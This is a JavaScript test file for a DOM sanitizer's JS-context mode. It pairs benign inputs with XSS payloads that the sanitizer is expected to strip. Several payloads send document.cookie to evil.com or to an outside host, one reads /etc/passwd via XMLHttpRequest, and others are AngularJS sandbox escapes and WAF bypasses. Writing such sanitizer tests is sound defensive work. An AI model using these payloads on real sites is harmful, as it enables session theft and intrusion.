/* global DOMSanitizer */
'use strict';

var tests = [
    /*
     * JS context common tests
     */
    {
        'name': 'JS context common test #1',
        'payload': '"};alert(1);var f={"t":"',
        'expected': ''
    },
    {
        'name': 'JS context common test #3',
        'payload': 'a=1;alert(1); var t',
        'expected': ''
    },
    {
        'name': 'JS context common test #3',
        'payload': ';/**/alert(1);//',
        'expected': ''
    },
    {
        'name': 'JS context common test #4',
        'payload': 'var script = document.createElement(\'script\'); script.type = \'text/javascript\'; script.src = url;document.getElementsByTagName(\'head\')[0].appendChild(script);a=',
        'expected': ''
    },
    {
        'name': 'JS context common test #5',
        'payload': 'var script = document.createElement("script"); script.type = "text/javascript"; script.src = url;document.getElementsByTagName("head")[0].appendChild(script);a=',
        'expected': ''
    },
    {
        'name': 'JS context common test #6',
        'payload': 'alert(1)',
        'expected': ''
    },
    {
        'name': 'JS context common test #7',
        'payload': '\'});alert(1);var f=({t:\'',
        'expected': ''
    },
    {
        'name': 'JS context common test #8',
        'payload': '"});alert(1);var f=({t:"',
        'expected': ''
    },
    {
        'name': 'JS context common test #9',
        'payload': ');alert(1);foo(',
        'expected': ''
    },
    {
        'name': 'JS context common test #10',
        'payload': '\');alert(1);foo(\'',
        'expected': ''
    },
    {
        'name': 'JS context common test #11',
        'payload': '");alert(1);foo("',
        'expected': ''
    },
    {
        'name': 'JS context common test #12',
        'payload': 'aa"}]};alert(1);var foo={"a":[{"bb":"cc"',
        'expected': ''
    },
    {
        'name': 'JS context common test #13',
        'payload': '*/if(1==1){//"));evilcode(1); /*',
        'expected': ''
    },
    {
        'name': 'JS context common test #14',
        'payload': 'aaa"}).init(); alert(1); require("page").setData({"type":"PAGE", "a":"aaaa',
        'expected': ''
    },
    {
        'name': 'JS context common test #15',
        'payload': '\'-alert(1)-\'',
        'expected': ''
    },
    {
        'name': 'JS context common test #16',
        'payload': '"-alert(1)-"',
        'expected': ''
    },
    {
        'name': 'JS context common test #17',
        'payload': 'document.title=1',
        'expected': ''
    },
    /*
     * Normal tests
     */
    {
        'name': 'JS context normal data test #1',
        'payload': '[a=1]',
        'expected': '%5Ba=1%5D'
    },
    {
        'name': 'JS context normal data test #2',
        'payload': '1111111111111111',
        'expected': '1111111111111111'
    },
    {
        'name': 'JS context normal data test #3',
        'payload': 'aaa=11111;secure;htponly',
        'expected': 'aaa=11111;secure;htponly'
    },
    {
        'name': 'JS context normal data test #4',
        'payload': 'aaa=1',
        'expected': 'aaa=1'
    },
    {
        'name': 'JS context normal data test #5',
        'payload': 'aaa=bbb=111',
        'expected': 'aaa=bbb=111'
    },
    {
        'name': 'JS context normal data test #6',
        'payload': '\'aaaaaaaaaaa\'',
        'expected': '\'aaaaaaaaaaa\''
    },
    {
        'name': 'JS context normal data test #7',
        'payload': '"aaaaaaaaaaa"',
        'expected': '%22aaaaaaaaaaa%22'
    },
    {
        'name': 'JS context normal data test #8',
        'payload': 'index.html',
        'expected': 'index.html'
    },
    {
        'name': 'JS context normal data test #9',
        'payload': '150763447.1860448730.1445593431.1446723513.1446723513.1',
        'expected': '150763447.1860448730.1445593431.1446723513.1446723513.1'
    },
    {
        'name': 'JS context normal data test #10',
        'payload': 'ID=63a03e24d94f3c99:T=1447055848:S=ALNI_Mad71OKEsNLD5woUsaYY5FKEoriHA',
        'expected': 'ID=63a03e24d94f3c99:T=1447055848:S=ALNI_Mad71OKEsNLD5woUsaYY5FKEoriHA'
    },
    {
        'name': 'JS context normal data test #11',
        'payload': 'key=thetradedesk:value=35044c17-ff3f-483a-ba31-df375587deeb:expiresAt=Sat+Nov+21+23%3A09%3A36+PST+2015:32-Compatible=true',
        'expected': 'key=thetradedesk:value=35044c17-ff3f-483a-ba31-df375587deeb:expiresAt=Sat+Nov+21+23%3A09%3A36+PST+2015:32-Compatible=true'
    },
    {
        'name': 'JS context normal data test #12',
        'payload': '/clck/jclck/reqid=1450762152102821-1591-V/rnd=14/yuid=84222/path=13.4/dtype=iweb/*http://yandex.ru/video/',
        'expected': '/clck/jclck/reqid=1450762152102821-1591-V/rnd=14/yuid=84222/path=13.4/dtype=iweb/*http://yandex.ru/video/'
    },
    {
        'name': 'JS context normal data test #13',
        'payload': '{"reaction":"ack","parsed":true,"server_notify_id":"p4f0QMXfsKo1:o4fhlo9HASw1:daria:mail"}',
        'expected': '%7B%22reaction%22:%22ack%22,%22parsed%22:true,%22server_notify_id%22:%22p4f0QMXfsKo1:o4fhlo9HASw1:daria:mail%22%7D'
    },
    {
        'name': 'JS context normal data test #14',
        'payload': 'this is a table',
        'expected': 'this%20is%20a%20table'
    },
    {
        'name': 'JS context normal data test #15',
        'payload': '{"data":[28,0,201,8,187,7,201,8,187,7]}',
        'expected': '%7B%22data%22:%5B28,0,201,8,187,7,201,8,187,7%5D%7D'
    },
    {
        'name': 'JS context normal data test #16',
        'payload': '{\'data\':[28,0,201,8,187,7,201,8,187,7]}',
        'expected': '%7B\'data\':%5B28,0,201,8,187,7,201,8,187,7%5D%7D'
    },
    {
        'name': 'JS context normal data test #17',
        'payload': '{}',
        'expected': '%7B%7D'
    },
    {
        'name': 'JS context normal data test #18',
        'payload': '134479a8-e8ab-4de8-b1ed-bdbb37eb1364',
        'expected': '134479a8-e8ab-4de8-b1ed-bdbb37eb1364'
    },
    {
        'name': 'JS context normal data test #19',
        'payload': '1000-1000-1000',
        'expected': '1000-1000-1000'
    },
    {
        'name': 'JS context normal data test #20',
        'payload': 'true',
        'expected': 'true'
    },
    {
        'name': 'JS context normal data test #21',
        'payload': '[]',
        'expected': '%5B%5D'
    },
    {
        'name': 'JS context normal data test #22',
        'payload': '0,1,123123123,false',
        'expected': '0,1,123123123,false'
    },
    {
        'name': 'JS context normal data test #23',
        'payload': '{"nrt":1462971105441,"nrt-e":1462971105441,"nrt-r":17520000}',
        'expected': '%7B%22nrt%22:1462971105441,%22nrt-e%22:1462971105441,%22nrt-r%22:17520000%7D'
    },
    {
        'name': 'JS context normal data test #24',
        'payload': 'gmail=A-B',
        'expected': 'gmail=A-B'
    },
    {
        'name': 'JS context normal data test #25',
        'payload': 'a=b=c',
        'expected': 'a=b=c'
    },
    {
        'name': 'JS context normal data test #26',
        'payload': 'a=c3:TM=1222:C=c:IP=1.1.1.1-:S=AB',
        'expected': 'a=c3:TM=1222:C=c:IP=1.1.1.1-:S=AB'
    },
    {
        'name': 'JS context normal data test #27',
        'payload': 'http://example.com/foo?a=1&b=2',
        'expected': 'http://example.com/foo?a=1&b=2'
    },
    {
        'name': 'JS context normal data test #28',
        'payload': 'foo=http://example.com/foo?a=1&b=2',
        'expected': 'foo=http://example.com/foo?a=1&b=2'
    },
    {
        'name': 'JS context normal data test #29',
        'payload': 'GA1.1.11233335445.345236546',
        'expected': 'GA1.1.11233335445.345236546'
    },
    /*
     * Grammar tests
     */
    {
        'name': 'AssignmentExpression test #1 (MemberExpression)',
        'payload': '";window.a=1;//',
        'expected': ''
    },
    {
        'name': 'AssignmentExpression test #2 (ArrayPattern)',
        'payload': '";[window.a]=1;//',
        'expected': ''
    },
    {
        'name': 'AssignmentExpression test #3 (ObjectPattern)',
        'payload': '";({x: x} = foo);//',
        'expected': ''
    },
    {
        'name': 'AssignmentExpression test #4 (FunctionExpression)',
        'payload': '";foo = function(){a=1;};//',
        'expected': ''
    },
    {
        'name': 'AssignmentExpression test #5 (CallExpression)',
        'payload': '";foo = bar();//',
        'expected': ''
    },
    {
        'name': 'ArrowFunctionExpression #1',
        'payload': '(foo)=>(bar)',
        'expected': ''
    },
    {
        'name': 'ArrowFunctionExpression #2',
        'payload': '$=>{return this}',
        'expected': ''
    },
    {
        'name': 'ArrowFunctionExpression #3',
        'payload': '$=>{return 1}',
        'expected': ''
    },
    {
        'name': 'ArrowFunctionExpression #4',
        'payload': '($=>this)();',
        'expected': ''
    },
    {
        'name': 'CallExpression #1',
        'payload': '";foo();//',
        'expected': ''
    },
    {
        'name': 'ExportDefaultDeclaration #1',
        'payload': 'export default function foo() {} false',
        'expected': ''
    },
    {
        'name': 'ExportNamedDeclaration #1',
        'payload': 'export var document',
        'expected': ''
    },
    {
        'name': 'ExportAllDeclaration #1',
        'payload': 'export * from "foo"',
        'expected': ''
    },
    {
        'name': 'ExportSpecifier #1',
        'payload': '";export * from "foo";//',
        'expected': ''
    },
    {
        'name': 'ForInStatement #1',
        'payload': '";for(i in foo);//',
        'expected': ''
    },
    {
        'name': 'ForOfStatement #1',
        'payload': '";for(i of foo);//',
        'expected': ''
    },
    {
        'name': 'FunctionDeclaration #1',
        'payload': '";funcion foo(){};//',
        'expected': ''
    },
    {
        'name': 'FunctionExpression #1',
        'payload': '";foo = function(){};//',
        'expected': ''
    },
    {
        'name': 'FunctionExpression #2',
        'payload': '\');var foo = function(){};foo(\'',
        'expected': ''
    },
    {
        'name': 'ImportDeclaration #1',
        'payload': 'import "jquery"',
        'expected': ''
    },
    {
        'name': 'ImportDefaultSpecifier #1',
        'payload': '";import $ from "jquery";//',
        'expected': ''
    },
    {
        'name': 'ImportNamespaceSpecifier #1',
        'payload': '\';import * as crypto from "crypto";//',
        'expected': ''
    },
    {
        'name': 'ImportSpecifier #1',
        'payload': 'import * as crypto from "crypto"',
        'expected': ''
    },
    {
        'name': 'NewExpression #1',
        'payload': '\';new foo();//\'',
        'expected': ''
    },
    {
        'name': 'NewExpression #2',
        'payload': ');new foo;//',
        'expected': ''
    },
    {
        'name': 'NewExpression #3',
        'payload': '";new foo();//',
        'expected': ''
    },
    {
        'name': 'NewExpression #4',
        'payload': '});function foo(){a=1;} new foo;"',
        'expected': ''
    },
    {
        'name': 'NewExpression #5',
        'payload': '});function foo(){a=1;} new foo;"',
        'expected': ''
    },
    {
        'name': 'ObjectPattern #1',
        'payload': '"};var {a, b} = {}',
        'expected': ''
    },
    {
        'name': 'ObjectPattern #2',
        'payload': '"};({x} = {x: 10})',
        'expected': ''
    },
    {
        'name': 'SpreadElement #1',
        'payload': '[..."abc"]',
        'expected': ''
    },
    {
        'name': 'TaggedTemplateExpression #1',
        'payload': 'alert `1`',
        'expected': ''
    },
    {
        'name': 'VariableDeclaration #1',
        'payload': '\';let a=1;a=\'aaa',
        'expected': ''
    },
    {
        'name': 'VariableDeclaration #2',
        'payload': '\';var a=1;a=\'aaa',
        'expected': ''
    },
    {
        'name': 'VariableDeclaration #3',
        'payload': '";const a=1;//',
        'expected': ''
    },
    {
        'name': 'WithStatement #1',
        'payload': 'with(window){a=1};',
        'expected': ''
    },
    /*
     * XSS PoC tests
     */
    {
        'name': 'XSS via Catch #1',
        'payload': '%5C%22));%7Dcatch(e)%7Balert(document.domain)%7D//',
        'expected': ''
    },
    {
        'name': 'XSS via Catch #1',
        'payload': '%5C%27));%7Dcatch(e)%7Balert(document.domain)%7D//',
        'expected': ''
    },
    
    // https://hackerone.com/reports/125027
    {
        'name': 'AngularJS template injection #1',
        'payload': 'wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz',
        'expected': ''
    },
    // http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
    {
        'name': 'AngularJS template injection #2',
        'payload': '{{constructor.constructor(\'alert(1)\')()}}',
        'expected': ''
    },
    // http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
    {
        'name': 'AngularJS template injection #3',
        'payload': '{{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=1} } };alert(1)//\');}}',
        'expected': ''
    },
    // http://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/
    {
        'name': 'OSX Message XSS',
        'payload': '%0d%0afunction%20reqListener%20()%20%7B%0A%20%20prompt(this.responseText)%3B%0A%7D%0Avar%20oReq%20%3D%20new%20XMLHttpRequest()%3B%0AoReq.addEventListener(%22load%22%2C%20reqListener)%3B%0AoReq.open(%22GET%22%2C%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0AoReq.send()%3B',
        'expected': ''
    },
    // https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Mini-Challenge-4
    {
        'name': 'H5SC-Mini-Challenge-4 XSS-1 test',
        'payload': '[alert(1)]',
        'expected': ''
    },
    // https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Mini-Challenge-4
    {
        'name': 'H5SC-Mini-Challenge-4 XSS-2 test',
        'payload': '\%22})));alert(1)}catch(e){}//',
        'expected': ''
    },
    // https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Mini-Challenge-4
    {
        'name': 'H5SC-Mini-Challenge-4 XSS-3 test',
        'payload': 'alert`1`',
        'expected': ''
    },
    // https://jsfiddle.net/raidendev/2gvffe4v/
    {
        'name': 'Andrew Kravtsov XSS PoC',
        'payload': '1),alert(location.origin),(1',
        'expected': ''
    },
    // https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#hidden-level--4
    {
        'name': 'prompt.ml challenge #1',
        'payload': ')},{0:prompt(1)',
        'expected': ''
    },
    // PHD VI, waf-bypass tests
    {
        'name': 'PHD VI, waf-bypass test #1',
        'payload': '\"};with(window){onload=function(){ with(document){k=cookie;};with(window){location=\'http://robotsfreedom.com/phdays/?a=test\'%2bk;};}}//;',
        'expected': ''
    },
    {
        'name': 'PHD VI, waf-bypass test #2',
        'payload': '\"};foo=function(){a=1};//;',
        'expected': ''
    },
    {
        'name': 'PHD VI, waf-bypass test #3',
        'payload': '\"};[window.onload]=111;//;',
        'expected': ''
    },
    {
        'name': 'PHD VI, waf-bypass test #4',
        'payload': '\"};a=new foo();//;',
        'expected': ''
    },
    // location-based exploits
    {
        'name': 'location-based test #1',
        'payload': 'location="javascript:alert(1)"',
        'expected': ''
    },
    {
        'name': 'location-based test #2',
        'payload': 'location=\'vbscript:alert(1)\'',
        'expected': ''
    },
    {
        'name': 'location-based test #3',
        'payload': 'location="javascript:alert\x281\x29"',
        'expected': ''
    },
    {
        'name': 'location-based test #4',
        'payload': 'location="javascript:alert\u00281\u0029"',
        'expected': ''
    },
    {
        'name': 'location-based test #5',
        'payload': 'location="http://evil.com/cookie" + document.cookie',
        'expected': ''
    },
    {
        'name': 'location-based test #6',
        'payload': 'location="//evil.com/cookie" + document.cookie',
        'expected': ''
    },
    {
        'name': 'location-based test #7',
        'payload': 'location.href="https://evil.com/cookie" + document.cookie',
        'expected': ''
    },
    {
        'name': 'location-based test #8',
        'payload': 'location.href="//evil.com/cookie" + document.cookie',
        'expected': ''
    },
    {
        'name': 'location-based test #9',
        'payload': 'location.href="//evil.com/"',
        'expected': ''
    },
    {
        'name': 'location-based test #10',
        'payload': 'a = location; a.href="//evil.com/"',
        'expected': ''
    },
    {
        'name': 'location-based test #11',
        'payload': 'a = location; a.href="//evil.com/" + document.cookie',
        'expected': ''
    },
    // JSON-based vectors
    {
        'name': 'json-based test #1',
        'payload': '{";alert(1);1+":"+"}',
        'expected': ''
    },
    {
        'name': 'json-based test #2',
        'payload': '[{";var g=/*":"*/alert;1+"},{";g(1);1+":"+"}]',
        'expected': ''
    }
];

var sanitizer = function() {
    var dirty = location.hash.substring(1);
    return DOMSanitizer.sanitize(dirty, {CONTEXTS: ['js']});
};

module.exports = {tests: tests, sanitizer: sanitizer};
